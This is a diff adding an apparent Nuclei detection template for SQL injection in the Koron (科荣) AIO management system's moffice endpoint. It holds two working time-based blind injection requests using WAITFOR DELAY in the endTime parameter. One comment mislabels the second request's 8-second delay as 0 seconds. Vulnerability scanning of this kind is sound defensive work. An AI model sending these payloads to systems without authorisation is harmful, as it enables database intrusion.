@@ -1,0 +1,35 @@
+id: poc-yaml-koron-aio-moffice-sqli-optimized
+
+info:
+  name: 科荣 AIO管理系统 moffice SQL注入漏洞
+  author: optimized
+  severity: high
+  tags: koron,科荣-AIO管理系统
+  description: |
+    This template detects SQL injection vulnerabilities in 科荣 AIO Management System's moffice endpoint.
+
+variables:
+  rand: "{{randstr}}"
+
+http:
+  - raw:
+      # 延迟请求（5秒）
+      - |
+        GET /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1{{rand}}';WAITFOR DELAY '0:0:5'--+&sid=1 HTTP/1.1
+        Host: {{Host}}
+
+      # 反向验证（0秒）
+      - |
+        GET /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1{{rand}}';WAITFOR DELAY '0:0:8'--+&sid=1 HTTP/1.1
+        Host: {{Host}}
+
+    matchers-condition: and
+    matchers:
+    - type: dsl
+      dsl:
+      - 'duration_1>=5 && duration_1<=6'
+      - 'duration_2>=8 && duration_2<=9'
+      condition: and
+    - type: status
+      status:
+      - 200
